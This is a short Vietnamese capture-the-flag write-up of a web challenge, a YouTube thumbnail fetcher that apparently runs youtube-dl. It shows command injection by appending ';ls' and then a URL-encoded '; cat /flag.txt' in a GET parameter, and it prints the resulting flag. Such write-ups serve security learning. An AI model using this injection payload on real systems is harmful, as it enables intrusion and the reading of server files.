Đây là chương trình lấy ảnh youtube bằng link, thử cung cấp 1 url

![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/b220a906-2418-477e-9676-6427c646e735)

Có vẻ đây là 1 lệnh linux sử dụng thư viện `youtube-dl`

Khả năng sẽ bị lỗi command injection, thêm `;ls`

Tên file `index.php` được trả về

![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/bdced06d-8086-443e-9440-93feba8eb5ce)

Đọc flag tại `;cat /flag.txt`

```
GET /?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dp6Yw0Bx5dbw%253B%2520cat%2520%252Fflag%252Etxt
```

![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/8a986a0b-b339-44fb-acc2-95b5d3cc95bb)

```CHH{Ea5y_cOmmaND_inj3c7Ion_b92d12df3a256af6d2baec30407d6c55}```
